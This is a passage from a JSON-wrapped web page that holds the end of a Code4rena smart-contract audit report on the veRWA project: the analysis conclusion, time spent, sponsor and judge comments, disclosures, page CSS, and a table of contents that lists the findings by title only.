<code>VotingEscrow</code> contract, you could learn about how decentralized governance and voting mechanisms are implemented. This could be valuable for understanding how community-driven decisions are made in various projects.</p>\n<p><strong>Tokenization and Rewards</strong>: </p>\n<ul>\n<li>The use of ERC-20 tokens (like CANTO) for rewards and incentives demonstrates the tokenization of value within DeFi ecosystems. Learning about how tokens are distributed as rewards can provide insights into incentivizing users’ participation.</li>\n</ul>\n<h2 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>In general, the <code>veRWA project</code> exhibits an interesting and well-developed architecture we believe the team has done a good job regarding the code, but the identified risks need to be addressed, and measures should be implemented to protect the protocol from potential malicious use cases. Additionally, it is recommended to improve the documentation and comments in the code to enhance understanding and collaboration among developers. It is also highly recommended that the team continues to invest in security measures such as mitigation reviews, audits, and bug bounty programs to maintain the security and reliability of the project. </p>\n<h3 id=\"time-spent-\" style=\"position:relative;\"><a href=\"#time-spent-\" aria-label=\"time spent  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Time Spent ⏱</h3>\n<p>A total of 2 days were spent to cover this audit, broken down into the following:</p>\n<ol>\n<li>1st Day: Trying to understand the protocol flows and implementation</li>\n<li>2nd Day: We focused on conducting the most comprehensive analysis possible, adding handcrafted diagrams based on the contracts and information provided by the protocol.</li>\n</ol>\n<p><strong>Time spent:</strong>\n24 hours</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/446#issuecomment-1680815830\">OpenCoreCH (veRWA) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Great report! I especially like the diagram.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/446#issuecomment-1698568381\">alcueca (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The diagrams in this report are representative of the effort put into it. Additionally, sections 5 (Documents), 6 (Risks) and 7 (Security Approach) complete the report further by providing additional insight. </p>\n<p>While the application description in <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/452\">#452</a> is more thorough and detailed, and should be reviewed by those exploring the codebase, this report offers more value for the sponsor, and is therefore selected for the report.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-8\">High Risk Findings (8)</a></p>\n<ul>\n<li><a href=\"#h-01-user-doesnt-have-to-deposit-for-a-week-into-the-market-to-get-their-weekly-reward-from-the-lendingledger\">[H-01] User doesn’t have to deposit for a week into the market to get their weekly reward from the <code>LendingLedger</code></a></li>\n<li><a href=\"#h-02-voters-from-votingescrow-can-vote-infinite-times-in-voteforgauge_weights-of-gaugecontroller\">[H-02] Voters from VotingEscrow can vote infinite times in vote<em>for</em>gauge_weights() of GaugeController</a></li>\n<li><a href=\"#h-03-when-adding-a-gauge-its-initial-value-has-to-be-set-by-an-admin-or-all-voting-power-towards-it-will-be-lost\">[H-03] When adding a gauge, its initial value has to be set by an admin or all voting power towards it will be lost</a></li>\n<li><a href=\"#h-04-delegated-votes-are-locked-when-owner-lock-is-expired\">[H-04] Delegated votes are locked when owner lock is expired</a></li>\n<li><a href=\"#h-05-it-is-possible-to-dos-all-the-functions-related-to-some-gauge-in-gaugecontroller\">[H-05] It is possible to DoS all the functions related to some gauge in <code>GaugeController</code></a></li>\n<li><a href=\"#h-06-users-may-be-forced-into-long-lock-times-to-be-able-to-undelegate-back-to-themselves\">[H-06] Users may be forced into long lock times to be able to undelegate back to themselves</a></li>\n<li><a href=\"#h-07-lack-of-access-control-in-lendingledgersolcheckpoint_lender-and-function-checkpoint_market\">[H-07] lack of access control in <code>LendingLedger.sol#checkpoint_lender</code> and function <code>checkpoint_market</code></a></li>\n<li><a href=\"#h-08-if-governance-removes-a-gauge-users-voting-power-for-that-gauge-will-be-lost\">[H-08] If governance removes a gauge, user’s voting power for that gauge will be lost</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-3\">Medium Risk Findings (3)</a></p>\n<ul>\n<li><a href=\"#m-01-users-can-front-run-calls-to-change_gauge_weight-to-gain-extra-voting-power\">[M-01] Users can front-run calls to <code>change_gauge_weight</code> to gain extra voting power</a></li>\n<li><a href=\"#m-02-upon-increaseamount-the-lock-may-not-align-to-the-nearest-weekly-increment\">[M-02] Upon IncreaseAmount the lock may not align to the nearest weekly increment</a></li>\n<li><a href=\"#m-03-replace-old_sum_bias-by-old_bias\">[M-03] Replace <code>old_sum_bias</code> by <code>old_bias</code></a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#01-casting-between-types-makes-values-negative-for-huge-input-values\">01 Casting between types makes values negative for huge input values</a></li>\n<li><a href=\"#02-bias-and-slope-can-be-made-negative-with-huge-deposits-thus-manipulating-total-voting-power\">02 Bias and slope can be made negative with huge deposits thus manipulating total voting power</a></li>\n<li><a href=\"#03-inconsistent-lock-durations\">03 Inconsistent Lock Durations</a></li>\n<li><a href=\"#04-unnecessary-modifiers-cost-gas\">04 Unnecessary Modifiers Cost Gas</a></li>\n<li><a href=\"#05-many-cases-of-precision-loss-from-multiply-after-divide\">05 Many cases of precision loss from multiply-after-divide</a></li>\n<li><a href=\"#06-inconsistent-use-of-natspec\">06 Inconsistent Use of NatSpec</a></li>\n<li><a href=\"#07-old-version-of-openzeppelin-contracts-used\">07 Old version of OpenZeppelin Contracts used</a></li>\n<li><a href=\"#08-error-messages-dont-match-intent\">08 Error Messages don’t match intent</a></li>\n<li><a href=\"#09-function-names-dont-match-intent\">09 Function Names don’t match intent</a></li>\n<li><a href=\"#10-dead-code\">10 Dead Code</a></li>\n<li><a href=\"#11-todos-included-in-codecomments\">11 TODOs included in code/comments</a></li>\n<li><a href=\"#12-reference-to-non-existent-documentation\">12 Reference to non-existent documentation</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#audit-analysis\">Audit Analysis</a></p>\n<ul>\n<li><a href=\"#description-of-verwa-project\">Description of <code>veRWA project</code></a></li>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#1--approach-we-followed-when-reviewing-the-code\">1- Approach we followed when reviewing the code</a></li>\n<li><a href=\"#2--analysis-of-the-code-base\">2- Analysis of the code base</a></li>\n<li><a href=\"#3--test-analysis\">3- Test analysis</a></li>\n<li><a href=\"#4--architectural\">4- Architectural</a></li>\n<li><a href=\"#5--documents\">5- Documents</a></li>\n<li><a href=\"#6--systemic--centralization-risks\">6- Systemic &#x26; Centralization Risks</a></li>\n<li><a href=\"#7--security-approach-of-the-project\">7- Security Approach of the Project</a></li>\n<li><a href=\"#8--other-audit-reports-and-automated-findings\">8- Other Audit Reports and Automated Findings</a></li>\n<li><a href=\"#9--new-insights-and-learning-from-this-audit\">9- New insights and learning from this audit</a></li>\n<li><a href=\"#conclusion\">Conclusion</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}